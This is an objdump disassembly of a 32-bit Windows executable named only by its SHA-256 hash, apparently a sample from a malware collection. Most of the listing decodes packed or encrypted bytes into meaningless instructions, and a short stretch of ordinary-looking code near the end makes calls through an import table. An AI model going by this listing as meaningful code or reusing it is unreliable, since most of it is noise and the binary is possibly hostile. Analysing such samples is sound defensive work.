
4d79d106c8706a8e97321daba4fb5e1ad81dece5fac83ece4b2500dc8b08421e.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	mov    ds:0x1084befb,al
  4d0005:	inc    ebx
  4d0006:	arpl   WORD PTR [ebx-0x747cd747],si
  4d000c:	jge    0x4cfff4
  4d000e:	popa   
  4d000f:	in     al,dx
  4d0010:	jge    0x4d0064
  4d0012:	pop    edi
  4d0013:	stos   DWORD PTR es:[edi],eax
  4d0014:	cmp    DWORD PTR [esi-0xb],esi
  4d0017:	add    bl,BYTE PTR [eax]
  4d0019:	loop   0x4cffb5
  4d001b:	lea    edx,[edi+eiz*8]
  4d001e:	call   0x75baf056
  4d0023:	scas   al,BYTE PTR es:[edi]
  4d0024:	push   cs
  4d0025:	push   ss
  4d0026:	dec    edi
  4d0027:	inc    esi
  4d0028:	fcomi  st,st(7)
  4d002a:	mov    al,0xb9
  4d002c:	mov    BYTE PTR es:[ecx-0x1d223ba9],cl
  4d0033:	fld    TBYTE PTR [edi+0x50]
  4d0036:	adc    DWORD PTR [eax-0x40295002],0x6af45084
  4d0040:	fidiv  WORD PTR [ebx+ecx*1]
  4d0043:	ins    BYTE PTR es:[edi],dx
  4d0044:	scas   al,BYTE PTR es:[edi]
  4d0045:	mov    ds:0xdd8fd6f8,eax
  4d004a:	jg     0x4d00c5
  4d004c:	jb     0x4cfff0
  4d004e:	test   BYTE PTR [esi+0x6c638905],al
  4d0054:	add    DWORD PTR [edi-0x64],esi
  4d0057:	lock mov edi,DWORD PTR [esi+0x1d]
  4d005b:	and    BYTE PTR [esi-0x7f],dh
  4d005e:	loop   0x4cffec
  4d0060:	jae    0x4d00d3
  4d0062:	and    BYTE PTR [ebx-0x72],dh
  4d0065:	pop    ss
  4d0066:	mov    DWORD PTR es:[ebp-0x22],edx
  4d006a:	inc    esp
  4d006b:	ficom  DWORD PTR [ebx+eiz*2]
  4d006e:	daa    
  4d006f:	xchg   edx,eax
  4d0070:	pop    esp
  4d0071:	add    eax,0x6b06d321
  4d0076:	xor    eax,DWORD PTR [eax+0x8d4eafa]
  4d007c:	or     eax,0x3a5f2b7f
  4d0081:	repz cmp DWORD PTR [esi],eax
  4d0084:	das    
  4d0085:	push   ebp
  4d0086:	sub    ebx,DWORD PTR [ebx+0x42]
  4d0089:	jmp    DWORD PTR [edi]
  4d008b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d008c:	adc    al,0x9
  4d008e:	popa   
  4d008f:	mov    ds:0x766379f1,al
  4d0094:	jp     0x4d005c
  4d0096:	add    al,0x8a
  4d0098:	xchg   edi,eax
  4d0099:	cmp    ebx,edi
  4d009b:	fisttp QWORD PTR [esi]
  4d009d:	int    0x4
  4d009f:	and    bl,BYTE PTR [ebp+0x33]
  4d00a2:	cli    
  4d00a3:	xor    esi,DWORD PTR [edi+edx*2-0x57132e02]
  4d00aa:	add    DWORD PTR [esi],ebp
  4d00ac:	gs in  al,0xb3
  4d00af:	mov    ds:0x174c1b95,al
  4d00b4:	adc    bl,ch
  4d00b6:	mov    bl,0xe8
  4d00b8:	in     al,0xb9
  4d00ba:	verr   WORD PTR [esi-0x47000fb5]
  4d00c1:	adc    dl,BYTE PTR [edi+0x51436d34]
  4d00c7:	lds    ebx,FWORD PTR [eax-0x5fdd5144]
  4d00cd:	dec    eax
  4d00ce:	push   ecx
  4d00cf:	fucomp st(4)
  4d00d1:	scas   eax,DWORD PTR es:[edi]
  4d00d2:	sbb    DWORD PTR [ebx],esp
  4d00d4:	jg     0x4d0126
  4d00d6:	in     eax,0x52
  4d00d8:	out    0x6,al
  4d00da:	sbb    al,BYTE PTR [ebx]
  4d00dc:	inc    ebx
  4d00dd:	test   BYTE PTR [ebx],dh
  4d00df:	sub    BYTE PTR gs:[eax+eiz*1-0xd],bh
  4d00e4:	fdivr  DWORD PTR [eax-0x6285a2fd]
  4d00ea:	push   ebx
  4d00eb:	mov    ds:0xb5048edc,al
  4d00f0:	and    al,0xc7
  4d00f2:	adc    esi,DWORD PTR [ebx]
  4d00f4:	push   es
  4d00f5:	cmp    al,0xec
  4d00f7:	int3   
  4d00f8:	xchg   BYTE PTR [edx],cl
  4d00fa:	push   eax
  4d00fb:	sar    BYTE PTR [edi-0x5],0x15
  4d00ff:	aaa    
  4d0100:	ret    0xea1a
  4d0103:	call   0x6f9bfcbc
  4d0108:	cmp    DWORD PTR [eax-0x3e],0xa7bbd81b
  4d010f:	call   0x17d545a5
  4d0114:	jo     0x4d00d0
  4d0116:	call   0x6d91e553
  4d011b:	xlat   BYTE PTR ds:[ebx]
  4d011c:	test   al,0x38
  4d011e:	(bad)  
  4d011f:	js     0x4d00ce
  4d0121:	xor    DWORD PTR ds:0x50cda7de,eax
  4d0127:	cs scas al,BYTE PTR es:[edi]
  4d0129:	pushf  
  4d012a:	mov    cl,0x28
  4d012c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d012d:	mov    ecx,0x41e6a6d9
  4d0132:	sbb    bh,dh
  4d0134:	jns    0x4d00f3
  4d0136:	cmp    ecx,DWORD PTR [esi]
  4d0138:	loopne 0x4d0107
  4d013a:	xchg   edx,eax
  4d013b:	cmc    
  4d013c:	push   0x6e
  4d013e:	cli    
  4d013f:	sub    DWORD PTR [edi+0x619c5d1c],0xffffff9a
  4d0146:	in     al,0x77
  4d0148:	mov    ds:0xa73f2b5d,eax
  4d014d:	test   al,0x34
  4d014f:	dec    esp
  4d0150:	mov    eax,ds:0xd474506b
  4d0155:	aad    0x3a
  4d0157:	shl    DWORD PTR ds:0x6a185af,cl
  4d015d:	cmp    DWORD PTR [ebx+eiz*2],ecx
  4d0160:	sti    
  4d0161:	(bad)  
  4d0162:	jle    0x4d01c9
  4d0164:	xchg   ecx,eax
  4d0165:	and    BYTE PTR [ebp+0x5a81e582],0x7d
  4d016c:	pop    ds
  4d016d:	cmc    
  4d016e:	mov    ecx,0xd11b5981
  4d0173:	std    
  4d0174:	mov    ah,0xe7
  4d0176:	sub    DWORD PTR [esi-0x63],ebx
  4d0179:	mov    ds:0xadb4f4aa,eax
  4d017e:	lods   al,BYTE PTR ds:[esi]
  4d017f:	pop    esp
  4d0180:	lahf   
  4d0181:	mov    esp,0x42b9f457
  4d0186:	(bad)  
  4d0187:	pop    ss
  4d0188:	mov    eax,ds:0x533fc1f0
  4d018d:	mov    edx,0x39794b9d
  4d0192:	pop    es
  4d0193:	mov    ah,0xdd
  4d0195:	rcl    BYTE PTR [eax-0x53],cl
  4d0198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0199:	hlt    
  4d019a:	xlat   BYTE PTR ds:[ebx]
  4d019b:	xor    al,0xb
  4d019d:	hlt    
  4d019e:	xor    ecx,esp
  4d01a0:	test   BYTE PTR [ebx],0xb4
  4d01a3:	mov    ch,0xb
  4d01a5:	hlt    
  4d01a6:	dec    ebx
  4d01a7:	mov    ds:0x5df40c5e,al
  4d01ac:	mov    ds:0xb40a81f2,eax
  4d01b1:	cwde   
  4d01b2:	jns    0x4d0135
  4d01b4:	cmp    eax,0xc4829150
  4d01b9:	scas   eax,DWORD PTR es:[edi]
  4d01ba:	sar    BYTE PTR [edx+esi*2-0x80],cl
  4d01be:	sub    eax,0x5dd78f83
  4d01c3:	mov    ebp,0x4ee2b37e
  4d01c8:	mov    esp,0x492535a4
  4d01cd:	out    0xca,al
  4d01cf:	lds    ebp,FWORD PTR [edi+0x555e41a5]
  4d01d5:	mov    ds:0x851d2cfa,eax
  4d01da:	or     dl,cl
  4d01dc:	ins    DWORD PTR es:[edi],dx
  4d01dd:	repz movsx eax,WORD PTR [ecx+ebp*1]
  4d01e2:	push   esi
  4d01e3:	cmp    BYTE PTR [esi],bh
  4d01e5:	in     eax,dx
  4d01e6:	test   eax,0xba1f38e7
  4d01eb:	mov    ecx,0x4645e0e1
  4d01f0:	stos   DWORD PTR es:[edi],eax
  4d01f1:	pop    edi
  4d01f2:	jmp    0x4713:0x14a8ce42
  4d01f9:	aas    
  4d01fa:	(bad)  
  4d01fb:	out    dx,eax
  4d01fc:	mov    edx,0x9fd9fac0
  4d0201:	enter  0x4a79,0x7e
  4d0205:	cwde   
  4d0206:	(bad)  
  4d0207:	popf   
  4d0208:	shr    BYTE PTR [ebx+0x29],0x62
  4d020c:	cdq    
  4d020d:	adc    eax,0xec68f64f
  4d0212:	mov    al,0x9
  4d0214:	push   cs
  4d0215:	and    ebx,edx
  4d0217:	cli    
  4d0218:	pop    ss
  4d0219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d021a:	sub    ch,BYTE PTR [ecx]
  4d021c:	jmp    0x4f19:0x16d6d55b
  4d0223:	sub    eax,0x96711a3b
  4d0228:	es jno 0x4d01ad
  4d022b:	ins    DWORD PTR es:[edi],dx
  4d022c:	push   ecx
  4d022d:	retf   
  4d022e:	or     BYTE PTR [ecx+0x30],cl
  4d0231:	xor    eax,0xc156b6f7
  4d0236:	jge    0x4d01f4
  4d0238:	scas   al,BYTE PTR es:[edi]
  4d0239:	xor    DWORD PTR [esi],ecx
  4d023b:	ret    0x535f
  4d023e:	icebp  
  4d023f:	mov    dl,0xc
  4d0241:	mov    al,0x9
  4d0243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0244:	hlt    
  4d0245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0246:	cli    
  4d0247:	(bad)  
  4d0249:	iret   
  4d024a:	or     DWORD PTR [edi+0x33],esi
  4d024d:	xchg   dh,dh
  4d024f:	fsub   DWORD PTR [eax*1-0x121fc880]
  4d0256:	or     eax,edi
  4d0258:	into   
  4d0259:	xchg   edi,eax
  4d025a:	mov    ah,0xae
  4d025c:	cs xchg esp,eax
  4d025e:	inc    edx
  4d025f:	frstor [ecx-0x4b8cf136]
  4d0265:	lahf   
  4d0266:	cmc    
  4d0267:	frstor [edi+ebx*2+0x2bb32e60]
  4d026e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d026f:	push   esi
  4d0270:	push   cs
  4d0271:	gs jmp 0xcbff:0xa2ab3934
  4d0279:	stos   DWORD PTR es:[edi],eax
  4d027a:	or     al,BYTE PTR [esi+0x2310c8f6]
  4d0280:	or     esi,DWORD PTR [edi]
  4d0282:	out    dx,eax
  4d0283:	pop    esp
  4d0284:	imul   ecx,ebp,0xffffff9d
  4d0287:	out    0x99,eax
  4d0289:	xor    al,0x87
  4d028b:	pop    ss
  4d028c:	addr16 retf 
  4d028e:	clc    
  4d028f:	cmp    BYTE PTR [ecx+0x67db2ba9],bl
  4d0295:	lods   al,BYTE PTR ds:[esi]
  4d0296:	fmul   st(7),st
  4d0298:	test   DWORD PTR [ebx+eax*4],esi
  4d029b:	mov    ss,esp
  4d029d:	and    al,0xd1
  4d029f:	sar    DWORD PTR [esi+0x32],0x2e
  4d02a3:	xchg   esp,eax
  4d02a4:	(bad)  
  4d02a5:	and    eax,0xc5863255
  4d02aa:	cmp    ch,BYTE PTR [edi]
  4d02ac:	ds fwait
  4d02ae:	push   eax
  4d02af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02b0:	dec    esi
  4d02b1:	push   edi
  4d02b2:	mov    bl,0xd1
  4d02b4:	out    dx,eax
  4d02b5:	shl    DWORD PTR [edx+0x6cfe9762],cl
  4d02bb:	and    edi,edi
  4d02bd:	add    DWORD PTR [ebx+0x118c8dde],edx
  4d02c3:	and    dh,BYTE PTR [ebx+esi*2+0x79]
  4d02c7:	xchg   esp,eax
  4d02c8:	sub    eax,0x596b868d
  4d02cd:	imul   ecx,DWORD PTR [ecx+0x76972918],0x375bdbe7
  4d02d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02d8:	push   ds
  4d02d9:	test   al,0xc3
  4d02db:	lods   al,BYTE PTR ds:[esi]
  4d02dc:	outs   dx,BYTE PTR ds:[esi]
  4d02dd:	sbb    al,0x8d
  4d02df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02e0:	in     eax,0x33
  4d02e2:	fstp   QWORD PTR [edi-0x7c]
  4d02e5:	int3   
  4d02e6:	xor    ah,BYTE PTR [eax+0x48508a7d]
  4d02ec:	mov    ch,al
  4d02ee:	sbb    DWORD PTR [ecx+eiz*8+0x2043f63a],edi
  4d02f5:	sbb    al,0x8b
  4d02f7:	rol    BYTE PTR ds:0xfc3f84e4,0x1a
  4d02fe:	ror    esp,1
  4d0300:	add    al,0x3b
  4d0302:	cmp    ecx,DWORD PTR [ebp+0x3af07256]
  4d0308:	cld    
  4d0309:	sbb    al,bl
  4d030b:	xchg   esi,eax
  4d030c:	out    dx,al
  4d030d:	push   0x11
  4d030f:	outs   dx,BYTE PTR ds:[esi]
  4d0310:	inc    esi
  4d0311:	push   ebp
  4d0312:	push   ebp
  4d0313:	aas    
  4d0314:	and    DWORD PTR [ebx+ebp*4-0x10],edx
  4d0318:	push   esp
  4d0319:	mov    ah,0x79
  4d031b:	push   cs
  4d031c:	mov    esp,0x59f2864b
  4d0321:	mov    ebx,0xd201fc5b
  4d0326:	call   0x69cc0752
  4d032b:	sub    ah,bh
  4d032d:	mov    cl,0xfe
  4d032f:	xlat   BYTE PTR ds:[ebx]
  4d0330:	adc    eax,0x6f7f014e
  4d0335:	call   0x2f64:0x9691d103
  4d033c:	sub    BYTE PTR [ecx-0x65],0x27
  4d0340:	add    bl,BYTE PTR [ebx+0x650fd888]
  4d0346:	ja     0x4d036e
  4d0348:	inc    edi
  4d0349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d034a:	xchg   DWORD PTR [edi],ebp
  4d034c:	(bad)  
  4d034d:	mov    dl,0xd1
  4d034f:	sub    BYTE PTR [ebx-0x10b3082e],dl
  4d0355:	mov    cs,ebx
  4d0357:	adc    edi,ebp
  4d0359:	js     0x4d033c
  4d035b:	into   
  4d035c:	add    DWORD PTR ds:0x76c33453,edx
  4d0362:	xchg   ebp,eax
  4d0363:	push   edi
  4d0364:	xor    DWORD PTR [ebx+0x7b],eax
  4d0367:	test   al,0xd0
  4d0369:	mov    esp,0x4330436c
  4d036e:	xchg   ebx,eax
  4d036f:	jbe    0x4d0361
  4d0371:	mov    esp,0x24f9896c
  4d0376:	xchg   ebx,eax
  4d0377:	jbe    0x4d0380
  4d0379:	xor    ah,BYTE PTR [esi]
  4d037b:	xchg   ecx,eax
  4d037c:	cli    
  4d037d:	int    0xd9
  4d037f:	push   esi
  4d0380:	fnsave [ecx]
  4d0382:	es test eax,0x8b659eaf
  4d0388:	jbe    0x4d03a4
  4d038a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d038b:	je     0x4d0318
  4d038d:	in     eax,0x43
  4d038f:	push   ebx
  4d0390:	jne    0x4d03ac
  4d0392:	mov    esp,0xe718a38
  4d0397:	mov    al,0x35
  4d0399:	mov    ?,ecx
  4d039b:	dec    edi
  4d039c:	push   DWORD PTR [ecx]
  4d039e:	pop    edi
  4d039f:	jno    0x4d036b
  4d03a1:	aad    0x61
  4d03a3:	xchg   ebx,eax
  4d03a4:	pop    ebx
  4d03a5:	aaa    
  4d03a6:	lahf   
  4d03a7:	jo     0x4d0373
  4d03a9:	je     0x4d0390
  4d03ab:	dec    edi
  4d03ac:	lods   al,BYTE PTR ds:[esi]
  4d03ad:	jl     0x4d0422
  4d03af:	cmp    ecx,DWORD PTR [edi+edi*4+0x51]
  4d03b3:	cmp    DWORD PTR [eax-0x2b5bdc76],edi
  4d03b9:	test   eax,0x56371500
  4d03be:	(bad)  
  4d03bf:	jmp    0xd04e:0x15003fb2
  4d03c6:	mov    dh,0xf7
  4d03c8:	or     DWORD PTR [esi+0x7200c19a],ecx
  4d03ce:	gs ds jmp 0x180e9de8
  4d03d5:	inc    esi
  4d03d6:	dec    esi
  4d03d7:	mov    esi,0xcbb1b9e9
  4d03dc:	mov    WORD PTR [edx+0x6a],gs
  4d03df:	xchg   ebp,eax
  4d03e0:	cmp    bh,ah
  4d03e2:	push   esi
  4d03e3:	push   ebx
  4d03e4:	out    0xd1,al
  4d03e6:	leave  
  4d03e7:	lods   al,BYTE PTR ds:[esi]
  4d03e8:	sbb    ebp,DWORD PTR [esi]
  4d03ea:	jle    0x4d03b3
  4d03ec:	push   ss
  4d03ed:	mov    eax,DWORD PTR [eax+edi*1+0x3bc374eb]
  4d03f4:	ds inc esp
  4d03f6:	pop    ebp
  4d03f7:	(bad)
  4d03fb:	scas   eax,DWORD PTR es:[edi]
  4d03fc:	pop    esi
  4d03fd:	std    
  4d03fe:	sbb    DWORD PTR [eax-0x5d],edx
  4d0401:	add    ch,BYTE PTR [esi]
  4d0403:	and    al,0x76
  4d0405:	mov    dh,0x12
  4d0407:	fmul   QWORD PTR [ebx-0x7967cab7]
  4d040d:	outs   dx,DWORD PTR ds:[esi]
  4d040e:	iret   
  4d040f:	addr16 jnp 0x4d03a2
  4d0412:	js     0x4d0420
  4d0414:	mov    gs,WORD PTR [eax]
  4d0416:	enter  0x73f3,0xd7
  4d041a:	jg     0x4d039c
  4d041c:	mov    ?,WORD PTR [ebx-0x52c926bf]
  4d0422:	dec    ecx
  4d0423:	jl     0x4d0460
  4d0425:	aam    0xa8
  4d0427:	adc    eax,0x75cf71b0
  4d042c:	sahf   
  4d042d:	idiv   BYTE PTR [ebx-0x63791978]
  4d0433:	ja     0x4d03c4
  4d0435:	jl     0x4d049b
  4d0437:	std    
  4d0438:	retf   0xe10e
  4d043b:	bound  edi,QWORD PTR [ecx+esi*4-0x6b314d6d]
  4d0442:	test   al,0x9f
  4d0444:	in     eax,dx
  4d0445:	outs   dx,DWORD PTR ds:[esi]
  4d0446:	push   edi
  4d0447:	pusha  
  4d0448:	adc    al,0x78
  4d044a:	dec    esi
  4d044b:	mov    eax,ds:0x620b87ed
  4d0450:	add    al,0x7c
  4d0452:	in     al,dx
  4d0453:	leave  
  4d0454:	lds    edi,FWORD PTR [edi+0x4db18e88]
  4d045a:	jp     0x4d0442
  4d045c:	lods   al,BYTE PTR ds:[esi]
  4d045d:	mov    ch,0x2
  4d045f:	jbe    0x4d03e1
  4d0461:	xchg   edi,eax
  4d0462:	pop    ecx
  4d0463:	cmovp  ebx,ebp
  4d0466:	mov    cl,0x9d
  4d0468:	pop    es
  4d0469:	push   esi
  4d046a:	adc    BYTE PTR [ebp+0x46d92da5],bh
  4d0470:	ds mov dh,0x88
  4d0473:	jl     0x4d0498
  4d0475:	int    0xf4
  4d0477:	iret   
  4d0478:	fisub  WORD PTR [esi+0x5932181d]
  4d047e:	loop   0x4d0467
  4d0480:	pop    edx
  4d0481:	and    al,0x72
  4d0483:	popf   
  4d0484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0485:	push   eax
  4d0486:	xchg   esp,eax
  4d0487:	or     eax,0xf26c5343
  4d048c:	mov    esi,0x426e570d
  4d0491:	dec    eax
  4d0492:	in     eax,0x1c
  4d0494:	xchg   edi,eax
  4d0495:	inc    ebx
  4d0496:	nop
  4d0497:	das    
  4d0498:	cmc    
  4d0499:	add    eax,eax
  4d049b:	and    BYTE PTR [esi+eiz*2+0x40],bl
  4d049f:	fbstp  TBYTE PTR [ecx-0x5adfed67]
  4d04a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d04a6:	inc    esi
  4d04a7:	xor    bh,ah
  4d04a9:	push   ecx
  4d04aa:	lods   eax,DWORD PTR ds:[esi]
  4d04ab:	je     0x4d04af
  4d04ad:	out    0x52,eax
  4d04af:	mov    edi,edi
  4d04b1:	pusha  
  4d04b2:	ss mov ecx,0x3f54bf26
  4d04b8:	push   0x99c5684d
  4d04bd:	mov    dl,0x97
  4d04bf:	sahf   
  4d04c0:	or     DWORD PTR [esi+0x68],esp
  4d04c3:	popa   
  4d04c4:	clc    
  4d04c5:	and    al,0x8
  4d04c7:	retf   
  4d04c8:	pop    edx
  4d04c9:	inc    ebx
  4d04ca:	clc    
  4d04cb:	xor    al,0xb3
  4d04cd:	mov    esp,0x83a3ca5a
  4d04d2:	xor    al,BYTE PTR [edx+0x16]
  4d04d5:	or     al,0xcf
  4d04d7:	or     eax,0xeabcc376
  4d04dc:	jle    0x4d04c0
  4d04de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04df:	mov    dh,0x9b
  4d04e1:	sbb    eax,0x22f54958
  4d04e6:	aam    0x17
  4d04e8:	iret   
  4d04e9:	cmp    eax,0xc452d4ad
  4d04ee:	push   edx
  4d04ef:	sub    edx,DWORD PTR [edi]
  4d04f1:	pusha  
  4d04f2:	scas   eax,DWORD PTR es:[edi]
  4d04f3:	aam    0xea
  4d04f5:	rol    BYTE PTR [esi-0x6a],cl
  4d04f8:	pop    ss
  4d04f9:	xchg   edi,eax
  4d04fa:	shr    DWORD PTR [eax+0x3f],0x85
  4d04fe:	leave  
  4d04ff:	outs   dx,DWORD PTR ds:[esi]
  4d0500:	push   ss
  4d0501:	into   
  4d0502:	xor    eax,0xebd1fe6
  4d0507:	inc    BYTE PTR ds:[ebp+0x31]
  4d050b:	dec    BYTE PTR [esi+0x73028f3a]
  4d0511:	(bad)
  4d0514:	add    bh,BYTE PTR [eax+edx*2]
  4d0517:	xchg   esi,eax
  4d0518:	push   edx
  4d0519:	ret    
  4d051a:	add    eax,0x6ffd34a2
  4d051f:	inc    ebx
  4d0520:	and    BYTE PTR [edx],al
  4d0522:	out    0xd4,al
  4d0524:	(bad)
  4d0529:	cmp    eax,0xde86474a
  4d052e:	push   ss
  4d052f:	jl     0x4d050c
  4d0531:	mov    DWORD PTR [ebp-0x10],edx
  4d0534:	es jbe 0x4d0549
  4d0537:	or     BYTE PTR [edi-0x48],0x51
  4d053b:	out    0x1f,al
  4d053d:	mov    ebx,0x44367d24
  4d0542:	xor    DWORD PTR [edi-0x7ebb83b0],eax
  4d0548:	add    eax,0x817f1183
  4d054d:	cmp    eax,0xc2eace63
  4d0552:	add    al,0x9b
  4d0554:	test   DWORD PTR [ecx-0x3a1d329f],esi
  4d055a:	push   cs
  4d055b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d055c:	jae    0x4d04e8
  4d055e:	lock mov al,0x96
  4d0561:	clc    
  4d0562:	rcr    DWORD PTR [ebx-0xa],cl
  4d0565:	idiv   DWORD PTR [eax+edi*8+0x75]
  4d0569:	dec    eax
  4d056a:	in     eax,dx
  4d056b:	push   cs
  4d056c:	loop   0x4d0524
  4d056e:	push   0xeb9977fd
  4d0573:	push   edx
  4d0574:	hlt    
  4d0575:	ins    DWORD PTR es:[edi],dx
  4d0576:	push   0xffffff95
  4d0578:	xor    edx,DWORD PTR [edx-0x55a6956b]
  4d057e:	mov    ss,WORD PTR [esi]
  4d0580:	outs   dx,DWORD PTR ds:[esi]
  4d0581:	push   0x192e971
  4d0586:	xchg   esi,eax
  4d0587:	outs   dx,DWORD PTR ds:[esi]
  4d0588:	bound  esp,QWORD PTR [ebx+0x8651bb1]
  4d058e:	fsub   QWORD PTR [edx-0x6b]
  4d0591:	test   al,0x8c
  4d0593:	inc    edi
  4d0594:	les    eax,FWORD PTR [edx]
  4d0596:	and    al,0x7c
  4d0598:	out    0xfc,eax
  4d059a:	xor    DWORD PTR [eax+0x7c928672],edx
  4d05a0:	lock cmp al,0xc6
  4d05a3:	and    cl,0x18
  4d05a6:	and    bl,BYTE PTR [eax+eiz*1]
  4d05a9:	out    0xdd,eax
  4d05ab:	inc    eax
  4d05ac:	outs   dx,BYTE PTR ds:[esi]
  4d05ad:	pop    esi
  4d05ae:	xchg   edx,eax
  4d05af:	inc    edx
  4d05b0:	push   ebx
  4d05b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d05b2:	test   BYTE PTR [ecx],0xd2
  4d05b5:	imul   esp,DWORD PTR [esi-0x2],0x199962f
  4d05bc:	shr    BYTE PTR [ecx-0x32],cl
  4d05bf:	(bad)  
  4d05c0:	das    
  4d05c1:	xchg   esi,eax
  4d05c2:	xor    esp,eax
  4d05c4:	cmp    BYTE PTR [ebp-0x4f7c5d3c],bl
  4d05ca:	xchg   ebp,eax
  4d05cb:	ret    
  4d05cc:	sub    esi,DWORD PTR [esi+0x524a0c9d]
  4d05d2:	jecxz  0x4d05b5
  4d05d4:	mov    ecx,0x331e1cbd
  4d05d9:	xor    BYTE PTR [ecx+0x40],dh
  4d05dc:	int3   
  4d05dd:	push   esp
  4d05de:	mov    ?,WORD PTR ds:0x4e83726
  4d05e4:	inc    ecx
  4d05e5:	sub    DWORD PTR [eax+0x40],0x4d
  4d05e9:	mov    cl,0xb5
  4d05eb:	and    eax,0xaa7db561
  4d05f0:	adc    eax,0x1fa7462b
  4d05f5:	sahf   
  4d05f6:	sti    
  4d05f7:	and    DWORD PTR [edx+ebx*8+0x105ff008],0xffffffef
  4d05ff:	inc    ebx
  4d0600:	(bad)  
  4d0602:	rcr    BYTE PTR [esi-0x130f9965],cl
  4d0608:	jecxz  0x4d060b
  4d060a:	jp     0x4d0623
  4d060c:	xchg   dh,bh
  4d060e:	xchg   ebp,eax
  4d060f:	call   0x18215e8f
  4d0614:	test   ebp,edi
  4d0616:	cmp    esi,DWORD PTR [ebx+0x6c]
  4d0619:	test   BYTE PTR [eax+0x4f7b9691],dh
  4d061f:	stc    
  4d0620:	addr16 in eax,dx
  4d0622:	mov    ah,0x7
  4d0624:	call   0x7e43:0x664ba212
  4d062b:	push   ds
  4d062c:	fwait
  4d062d:	and    al,0x2
  4d062f:	loop   0x4d0697
  4d0631:	(bad)  [edi+0x21]
  4d0634:	add    eax,0x64e00225
  4d0639:	(bad)  
  4d063b:	pop    ds
  4d063c:	sbb    eax,0x836017c
  4d0641:	add    eax,0xfafacec3
  4d0646:	cmp    al,0xf4
  4d0648:	xchg   edi,eax
  4d0649:	pop    ebp
  4d064a:	ret    0x65dc
  4d064d:	ja     0x4d062f
  4d064f:	test   BYTE PTR [esi],ah
  4d0651:	lds    esp,FWORD PTR [ebx]
  4d0653:	enter  0xf328,0x8b
  4d0657:	add    al,0xb6
  4d0659:	dec    eax
  4d065a:	or     eax,0x3b436b82
  4d065f:	loopne 0x4d06d8
  4d0661:	das    
  4d0662:	sahf   
  4d0663:	cmp    ebp,DWORD PTR [edx-0x73]
  4d0666:	inc    eax
  4d0667:	xor    DWORD PTR [edx],esi
  4d0669:	and    DWORD PTR [ebx+eiz*4-0x71],ebx
  4d066d:	add    ch,ch
  4d066f:	clc    
  4d0670:	dec    edx
  4d0671:	imul   eax,eax,0x1e
  4d0674:	mov    ch,0x5e
  4d0676:	jmp    0x77c2:0xb00d9266
  4d067d:	jne    0x4d06da
  4d067f:	in     al,0x43
  4d0681:	jno    0x4d063e
  4d0683:	sbb    al,0xfe
  4d0685:	stos   BYTE PTR es:[edi],al
  4d0686:	inc    ebp
  4d0687:	outs   dx,BYTE PTR ds:[esi]
  4d0688:	mov    esi,0xd0599c9d
  4d068d:	and    eax,eax
  4d068f:	int3   
  4d0690:	xor    esi,DWORD PTR [ecx+0x7f]
  4d0693:	jmp    0x7133:0x15808ece
  4d069a:	jg     0x4d0686
  4d069c:	into   
  4d069d:	mov    es,WORD PTR [eax+0x7f713315]
  4d06a3:	jmp    0x7133:0x15808ece
  4d06aa:	jg     0x4d0696
  4d06ac:	into   
  4d06ad:	mov    es,WORD PTR [eax+0x7fd43315]
  4d06b3:	jmp    0x8033:0x158583ce
  4d06ba:	jp     0x4d06a6
  4d06bc:	push   edi
  4d06bd:	mov    BYTE PTR [ebx+ecx*1-0x20],ah
  4d06c1:	int    0x93
  4d06c3:	inc    edx
  4d06c4:	loop   0x4d064d
  4d06c6:	aam    0x2e
  4d06c8:	or     eax,0xf696d845
  4d06cd:	jle    0x4d06e3
  4d06cf:	pop    ss
  4d06d0:	sbb    DWORD PTR [edi],0xa3ba6867
  4d06d6:	pop    ss
  4d06d7:	cmp    ebp,DWORD PTR [esi+eiz*1-0x36deb063]
  4d06de:	mov    BYTE PTR [esi-0x5d],dh
  4d06e1:	dec    ebx
  4d06e2:	pop    es
  4d06e3:	xchg   edx,eax
  4d06e4:	(bad)  
  4d06e5:	fmul   QWORD PTR [esi-0x3]
  4d06e8:	repz inc esp
  4d06ea:	xchg   BYTE PTR [ebp+0x5f],bh
  4d06ed:	call   DWORD PTR ds:0x4d205c
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [edi-0x1],bl
  4d06fa:	adc    eax,0x4d2090
  4d06ff:	call   edi
  4d0701:	add    BYTE PTR [eax],al
  4d0703:	add    BYTE PTR [edi-0x1],bl
  4d0706:	adc    eax,0x4d2038
  4d070b:	call   edi
  4d070d:	add    BYTE PTR [eax],al
  4d070f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0715:	sub    esp,0x3c
  4d0718:	lea    ecx,[edi-0x110]
  4d071e:	or     DWORD PTR [ecx+0xac],0xffffb8e1
  4d0728:	push   ecx
  4d0729:	call   0x4d0be8
  4d072e:	add    esp,0x4
  4d0731:	pop    ecx
  4d0732:	push   ecx
  4d0733:	push   edx
  4d0734:	push   ebx
  4d0735:	push   DWORD PTR [ecx+0x17c]
  4d073b:	call   0x4d152c
  4d0740:	add    esp,0xc
  4d0743:	pop    ecx
  4d0744:	push   ecx
  4d0745:	mov    esi,0x0
  4d074a:	push   esi
  4d074b:	call   0x4d0b94
  4d0750:	add    esp,0x4
  4d0753:	pop    ecx
  4d0754:	add    esp,0x3c
  4d0757:	pop    ebp
  4d0758:	ret    
  4d0759:	add    BYTE PTR [eax],al
  4d075b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0761:	sub    esp,0x28
